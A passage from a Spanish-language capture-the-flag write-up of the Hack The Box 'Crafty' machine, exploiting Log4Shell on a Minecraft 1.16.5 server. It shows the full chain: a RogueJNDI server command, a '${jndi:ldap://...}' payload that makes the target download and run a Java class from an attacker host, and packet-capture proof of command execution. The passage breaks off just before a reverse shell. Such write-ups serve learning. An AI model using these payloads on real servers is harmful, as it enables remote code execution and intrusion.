<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">25565/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D"> open</span><span style="color:#B56959;--shiki-dark:#C3E88D">  minecraft</span><span style="color:#B56959;--shiki-dark:#C3E88D"> syn-ack</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ttl</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 127</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Minecraft</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1.16</span><span style="color:#B56959;--shiki-dark:#C3E88D">.5</span><span style="color:#393A34;--shiki-dark:#BABED8"> (Protocol: </span><span style="color:#2F798A;--shiki-dark:#F78C6C">127</span><span style="color:#B56959;--shiki-dark:#C3E88D">,</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Message:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Crafty</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Server,</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Users:</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 0</span><span style="color:#B56959;--shiki-dark:#C3E88D">/100</span><span style="color:#393A34;--shiki-dark:#BABED8">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Read</span><span style="color:#B56959;--shiki-dark:#C3E88D"> data</span><span style="color:#B56959;--shiki-dark:#C3E88D"> files</span><span style="color:#B56959;--shiki-dark:#C3E88D"> from:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /usr/bin/../share/nmap</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Service</span><span style="color:#B56959;--shiki-dark:#C3E88D"> detection</span><span style="color:#B56959;--shiki-dark:#C3E88D"> performed.</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Please</span><span style="color:#B56959;--shiki-dark:#C3E88D"> report</span><span style="color:#B56959;--shiki-dark:#C3E88D"> any</span><span style="color:#B56959;--shiki-dark:#C3E88D"> incorrect</span><span style="color:#B56959;--shiki-dark:#C3E88D"> results</span><span style="color:#B56959;--shiki-dark:#C3E88D"> at</span><span style="color:#B56959;--shiki-dark:#C3E88D"> https://nmap.org/submit/</span><span style="color:#B56959;--shiki-dark:#C3E88D"> .</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># Nmap done at Mon Jun 17 10:23:40 2024 -- 1 IP address (1 host up) scanned in 12.02 seconds</span></span></code></pre> 
<p>Se trata de un Minecraft Vanilla 1.16.5 por lo que parece. La versión 1.16.5 salió precisamente en septiembre de 2020, hace casi 4 años de la publicación de este post</p>
<p>Exactamente el 9 de diciembre de 2021, se reveló una vulnerabilidad que parecía afectar a cualquier versión de Minecraft entre los rangos de 1.6.5 y 1.18, al utilizar la librería Log4J para el logueo tanto del cliente como del servidor, hacía al juego vulnerable al CVE-2021-44228, en su momento varios aprovecharon esto para hackear servidores e incluso hackear a múltiples usuarios de diferentes servidores. Dado que este es el servidor Vanilla y 1.16.5 hay muchas posibilidades de que sea vulnerable a esta CVE.</p>
<p>La vulnerabilidad es que el logger Log4J por defecto puede procesar mensajes especiales encerrados en $, y uno de ellos da la posibilidad de utilizar el JNDI (Java Native Directory Interface) para cargar clases externas y ejecutarlas en el contexto de la aplicación Java, por lo que podemos utilizar RogueJNDI para dar al servidor lo que está buscando y ejecutar comandos como el usuario del sistema que ejecuta el servidor, pero primero tenemos que conectarnos al servidor de Minecraft.</p>
<p><img src="/src/assets/images/writeups/crafty/image-2.png" alt="alt text"/></p>
<p>Existen varios clientes CLI para esto, el que usaremos es el Minecraft Console Client que podemos descargar ya compilado en su sección de releases.</p>
<p>Usándolo, lo ajustamos para lo que queramos en su fichero de configuración generado o le damos a los ajustes que nos pide en pantalla y nos conectamos al servidor en cuestión:</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Minecraft</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Console</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Client</span><span style="color:#B56959;--shiki-dark:#C3E88D"> v1.20.4</span><span style="color:#B56959;--shiki-dark:#C3E88D"> -</span><span style="color:#B56959;--shiki-dark:#C3E88D"> for</span><span style="color:#B56959;--shiki-dark:#C3E88D"> MC</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1.4</span><span style="color:#B56959;--shiki-dark:#C3E88D">.6</span><span style="color:#B56959;--shiki-dark:#C3E88D"> to</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1.20</span><span style="color:#B56959;--shiki-dark:#C3E88D">.4</span><span style="color:#B56959;--shiki-dark:#C3E88D"> -</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Github.com/MCCTeam</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">GitHub</span><span style="color:#B56959;--shiki-dark:#C3E88D"> build</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 263</span><span style="color:#B56959;--shiki-dark:#C3E88D">,</span><span style="color:#B56959;--shiki-dark:#C3E88D"> built</span><span style="color:#B56959;--shiki-dark:#C3E88D"> on</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 2024</span><span style="color:#B56959;--shiki-dark:#C3E88D">-04-15</span><span style="color:#B56959;--shiki-dark:#C3E88D"> from</span><span style="color:#B56959;--shiki-dark:#C3E88D"> commit</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 403284</span><span style="color:#B56959;--shiki-dark:#C3E88D">c</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Resolving</span><span style="color:#B56959;--shiki-dark:#C3E88D"> crafty.htb...</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Login</span><span style="color:#B56959;--shiki-dark:#C3E88D"> :</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Password(invisible</span><span style="color:#393A34;--shiki-dark:#BABED8">): </span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">You</span><span style="color:#B56959;--shiki-dark:#C3E88D"> chose</span><span style="color:#B56959;--shiki-dark:#C3E88D"> to</span><span style="color:#B56959;--shiki-dark:#C3E88D"> run</span><span style="color:#B56959;--shiki-dark:#C3E88D"> in</span><span style="color:#B56959;--shiki-dark:#C3E88D"> offline</span><span style="color:#B56959;--shiki-dark:#C3E88D"> mode.</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Retrieving</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Server</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Info...</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Server</span><span style="color:#B56959;--shiki-dark:#C3E88D"> version</span><span style="color:#B56959;--shiki-dark:#C3E88D"> :</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1.16</span><span style="color:#B56959;--shiki-dark:#C3E88D">.5</span><span style="color:#393A34;--shiki-dark:#BABED8"> (protocol </span><span style="color:#B56959;--shiki-dark:#C3E88D">v754</span><span style="color:#393A34;--shiki-dark:#BABED8">)</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#393A34;--shiki-dark:#BABED8">MCC</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8"> Version is supported.</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Logging</span><span style="color:#B56959;--shiki-dark:#C3E88D"> in...</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#393A34;--shiki-dark:#BABED8">MCC</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8"> Server is </span><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">in</span><span style="color:#393A34;--shiki-dark:#BABED8"> offline mode.</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#393A34;--shiki-dark:#BABED8">MCC</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8"> Server was successfully joined.</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Type</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">/quit</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> to</span><span style="color:#B56959;--shiki-dark:#C3E88D"> leave</span><span style="color:#B56959;--shiki-dark:#C3E88D"> the</span><span style="color:#B56959;--shiki-dark:#C3E88D"> server.</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8"> </span></span></code></pre> 
<p>Ahora, para hacer que el JNDI ejecute una clase arbitraria abusando del bug de Log4J simplemente debemos hacer que el logger procese un mensaje con una cadena como <code>${jndi:ldap://HOST:PORT/}</code>, pero antes debemos tener un servidor especializado corriendo para procesar estas peticiones JNDI, yo usaré RogueJNDI como dije antes.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8"> java -jar RJNDI.jar -c </span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">ping -n 1 10.10.14.92</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#393A34;--shiki-dark:#BABED8"> -n 10.10.14.92</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">+-+-+-+-+-+-+-+-+-+</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#59873A;--shiki-dark:#FFCB6B">R</span><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#59873A;--shiki-dark:#FFCB6B">o</span><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#59873A;--shiki-dark:#FFCB6B">g</span><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#59873A;--shiki-dark:#FFCB6B">u</span><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#59873A;--shiki-dark:#FFCB6B">e</span><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#59873A;--shiki-dark:#FFCB6B">J</span><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#59873A;--shiki-dark:#FFCB6B">n</span><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#59873A;--shiki-dark:#FFCB6B">d</span><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#59873A;--shiki-dark:#FFCB6B">i</span><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">+-+-+-+-+-+-+-+-+-+</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Starting</span><span style="color:#B56959;--shiki-dark:#C3E88D"> HTTP</span><span style="color:#B56959;--shiki-dark:#C3E88D"> server</span><span style="color:#B56959;--shiki-dark:#C3E88D"> on</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 0.0</span><span style="color:#B56959;--shiki-dark:#C3E88D">.0.0:8000</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Starting</span><span style="color:#B56959;--shiki-dark:#C3E88D"> LDAP</span><span style="color:#B56959;--shiki-dark:#C3E88D"> server</span><span style="color:#B56959;--shiki-dark:#C3E88D"> on</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 0.0</span><span style="color:#B56959;--shiki-dark:#C3E88D">.0.0:1389</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Mapping</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ldap://10.10.14.92:1389/o=tomcat</span><span style="color:#B56959;--shiki-dark:#C3E88D"> to</span><span style="color:#B56959;--shiki-dark:#C3E88D"> artsploit.controllers.Tomcat</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Mapping</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ldap://10.10.14.92:1389/o=websphere1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> to</span><span style="color:#B56959;--shiki-dark:#C3E88D"> artsploit.controllers.WebSphere1</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Mapping</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ldap://10.10.14.92:1389/o=websphere1,wsdl=</span><span style="color:#A65E2B;--shiki-dark:#BABED8">*</span><span style="color:#B56959;--shiki-dark:#C3E88D"> to</span><span style="color:#B56959;--shiki-dark:#C3E88D"> artsploit.controllers.WebSphere1</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Mapping</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ldap://10.10.14.92:1389/o=websphere2</span><span style="color:#B56959;--shiki-dark:#C3E88D"> to</span><span style="color:#B56959;--shiki-dark:#C3E88D"> artsploit.controllers.WebSphere2</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Mapping</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ldap://10.10.14.92:1389/o=websphere2,jar=</span><span style="color:#A65E2B;--shiki-dark:#BABED8">*</span><span style="color:#B56959;--shiki-dark:#C3E88D"> to</span><span style="color:#B56959;--shiki-dark:#C3E88D"> artsploit.controllers.WebSphere2</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Mapping</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ldap://10.10.14.92:1389/o=groovy</span><span style="color:#B56959;--shiki-dark:#C3E88D"> to</span><span style="color:#B56959;--shiki-dark:#C3E88D"> artsploit.controllers.Groovy</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Mapping</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ldap://10.10.14.92:1389/</span><span style="color:#B56959;--shiki-dark:#C3E88D"> to</span><span style="color:#B56959;--shiki-dark:#C3E88D"> artsploit.controllers.RemoteReference</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Mapping</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ldap://10.10.14.92:1389/o=reference</span><span style="color:#B56959;--shiki-dark:#C3E88D"> to</span><span style="color:#B56959;--shiki-dark:#C3E88D"> artsploit.controllers.RemoteReference</span></span></code></pre> 
<p>Nos da el puerto del servidor LDAP y algunos mapeos para ejecutar clases Java específicas, usaremos artsploit.controllers.RemoteReference, y cuando enviamos <code>${jndi:ldap://10.10.14.92:1389/o=reference}</code> en el servidor Minecraft vemos en las consolas que:</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#998418;--shiki-dark:#82AAFF">...</span><span style="color:#393A34;--shiki-dark:#BABED8"> [snip]</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Sending</span><span style="color:#B56959;--shiki-dark:#C3E88D"> LDAP</span><span style="color:#B56959;--shiki-dark:#C3E88D"> reference</span><span style="color:#B56959;--shiki-dark:#C3E88D"> result</span><span style="color:#B56959;--shiki-dark:#C3E88D"> for</span><span style="color:#B56959;--shiki-dark:#C3E88D"> http://10.10.14.92:8000/xExportObject.class</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">new</span><span style="color:#B56959;--shiki-dark:#C3E88D"> http</span><span style="color:#B56959;--shiki-dark:#C3E88D"> request</span><span style="color:#B56959;--shiki-dark:#C3E88D"> from</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /10.10.11.249:49698</span><span style="color:#B56959;--shiki-dark:#C3E88D"> asking</span><span style="color:#B56959;--shiki-dark:#C3E88D"> for</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /xExportObject.class</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Sending</span><span style="color:#B56959;--shiki-dark:#C3E88D"> LDAP</span><span style="color:#B56959;--shiki-dark:#C3E88D"> reference</span><span style="color:#B56959;--shiki-dark:#C3E88D"> result</span><span style="color:#B56959;--shiki-dark:#C3E88D"> for</span><span style="color:#B56959;--shiki-dark:#C3E88D"> http://10.10.14.92:8000/xExportObject.class</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">new</span><span style="color:#B56959;--shiki-dark:#C3E88D"> http</span><span style="color:#B56959;--shiki-dark:#C3E88D"> request</span><span style="color:#B56959;--shiki-dark:#C3E88D"> from</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /10.10.11.249:49698</span><span style="color:#B56959;--shiki-dark:#C3E88D"> asking</span><span style="color:#B56959;--shiki-dark:#C3E88D"> for</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /xExportObject.class</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Sending</span><span style="color:#B56959;--shiki-dark:#C3E88D"> LDAP</span><span style="color:#B56959;--shiki-dark:#C3E88D"> reference</span><span style="color:#B56959;--shiki-dark:#C3E88D"> result</span><span style="color:#B56959;--shiki-dark:#C3E88D"> for</span><span style="color:#B56959;--shiki-dark:#C3E88D"> http://10.10.14.92:8000/xExportObject.class</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">new</span><span style="color:#B56959;--shiki-dark:#C3E88D"> http</span><span style="color:#B56959;--shiki-dark:#C3E88D"> request</span><span style="color:#B56959;--shiki-dark:#C3E88D"> from</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /10.10.11.249:49698</span><span style="color:#B56959;--shiki-dark:#C3E88D"> asking</span><span style="color:#B56959;--shiki-dark:#C3E88D"> for</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /xExportObject.class</span></span></code></pre> 
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8"> tshark -i tun0 icmp</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">    1</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 0.000000000</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.11.249</span><span style="color:#B56959;--shiki-dark:#C3E88D"> →</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.14.92</span><span style="color:#B56959;--shiki-dark:#C3E88D">  ICMP</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 60</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Echo</span><span style="color:#393A34;--shiki-dark:#BABED8"> (ping) request  id=0x0001, seq=1/256, ttl=127</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">    2</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 0.000069813</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.14.92</span><span style="color:#B56959;--shiki-dark:#C3E88D"> →</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.11.249</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ICMP</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 60</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Echo</span><span style="color:#393A34;--shiki-dark:#BABED8"> (ping) reply    id=0x0001, seq=1/256, ttl=64 </span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">request</span><span style="color:#B56959;--shiki-dark:#C3E88D"> in</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">    3</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1.019781479</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.11.249</span><span style="color:#B56959;--shiki-dark:#C3E88D"> →</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.14.92</span><span style="color:#B56959;--shiki-dark:#C3E88D">  ICMP</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 60</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Echo</span><span style="color:#393A34;--shiki-dark:#BABED8"> (ping) request  id=0x0001, seq=2/512, ttl=127</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">    4</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1.019871252</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.14.92</span><span style="color:#B56959;--shiki-dark:#C3E88D"> →</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.11.249</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ICMP</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 60</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Echo</span><span style="color:#393A34;--shiki-dark:#BABED8"> (ping) reply    id=0x0001, seq=2/512, ttl=64 </span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">request</span><span style="color:#B56959;--shiki-dark:#C3E88D"> in</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 3</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">    5</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 2.042625454</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.11.249</span><span style="color:#B56959;--shiki-dark:#C3E88D"> →</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.14.92</span><span style="color:#B56959;--shiki-dark:#C3E88D">  ICMP</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 60</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Echo</span><span style="color:#393A34;--shiki-dark:#BABED8"> (ping) request  id=0x0001, seq=3/768, ttl=127</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">    6</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 2.042666787</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.14.92</span><span style="color:#B56959;--shiki-dark:#C3E88D"> →</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.11.249</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ICMP</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 60</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Echo</span><span style="color:#393A34;--shiki-dark:#BABED8"> (ping) reply    id=0x0001, seq=3/768, ttl=64 </span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">request</span><span style="color:#B56959;--shiki-dark:#C3E88D"> in</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 5</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Efectivamente,</span><span style="color:#B56959;--shiki-dark:#C3E88D"> podemos</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ejecutar</span><span style="color:#B56959;--shiki-dark:#C3E88D"> comandos.</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Ahora</span><span style="color:#B56959;--shiki-dark:#C3E88D"> podemos</span><span style="color:#B56959;--shiki-dark:#C3E88D"> enviarnos</span><span style="color:#B56959;--shiki-dark:#C3E88D"> una</span><span style="color:#B56959;--shiki-dark:#C3E88D"> consola</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">```</span><span style="color:#59873A;--shiki-dark:#FFCB6B">bash</span></span>
